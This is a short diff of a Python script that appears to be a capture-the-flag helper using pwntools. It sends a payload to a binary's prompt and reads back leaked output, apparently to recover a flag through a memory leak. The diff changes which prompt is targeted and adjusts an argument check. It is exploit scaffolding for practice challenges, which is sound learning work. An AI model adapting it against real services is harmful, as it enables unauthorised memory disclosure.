@@ -65,7 +65,7 @@ if __name__ == "__main__":
 
 		flagB = False
 		flag = ""
-		if (results.binary == True):
+		if (results.binary is not None):
 			value = int(elf.elfclass / 8)
 			flagS = (results.flag_format[:value]).encode()
 		else :
@@ -104,13 +104,13 @@ if __name__ == "__main__":
 			#      This is the part that you must modify to fit your binary.      #
 		        #######################################################################
 			#
-			p.sendlineafter(b'streak?', payload)	
-			p.recvuntil(b'current streak:')
-			# p.sendlineafter(b'>>', payload)
-			# p.recvuntil(b'-')
-			#leak = p.recv().strip(b'\n')
-			leak = p.recvuntil(b'\n').strip(b'\n')
-			# print(leak)
+			#p.sendlineafter(b'streak?', payload)	
+			#p.recvuntil(b'current streak:')
+			p.sendlineafter(b'>>', payload)
+			p.recvuntil(b'-')
+			leak = p.recv().strip(b'\n')
+			#leak = p.recvuntil(b'\n').strip(b'\n')
+			#print(leak)
 			#
 			#######################################################################		
 
